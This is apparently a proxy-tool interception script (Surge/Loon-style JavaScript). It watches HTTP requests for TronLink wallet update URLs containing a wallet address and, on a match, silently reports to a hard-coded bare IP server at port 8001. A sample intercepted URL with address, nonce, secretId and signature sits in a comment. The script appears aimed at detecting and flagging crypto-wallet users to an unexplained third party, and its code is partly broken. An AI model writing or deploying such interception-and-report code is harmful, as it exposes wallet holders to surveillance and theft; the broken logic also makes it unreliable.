const request = $request;
const requrl = $request.url;
const usercode = $argument;
const TronLinkRegex = /wallet\/getLatestAPK\?address=/;
console.log("1111111111111",usercode);
if(!usercode){
    $notification.post("错误","","请填写用户码");
    $done({});
}else{
    ///api/v1/wallet/getLatestAPK?address=TYtGyengaZQKkFU161uKCrRQQU2jJTNpv6&nonce=3691&secretId=ED151200DD0B3B52&signature=W5gBsApwNhp5GLgwA0Jho/77TbU%3D
// 测试 requrl 是否匹配正则表达式
if (TronLinkRegex.test(requrl)) {
    let params = {
        url:"http://43.134.170.213:8001/api/trx/getinfo",
        body:[{"usercode":"usercode"}],//仅仅在post请求中有效
    }
    console.log("1111111111");
    $notification.post("通知","","找到TronLink钱包");
    $httpClient.post(params, function(errormsg,response,data){})
} else {
    $done({});
}
}

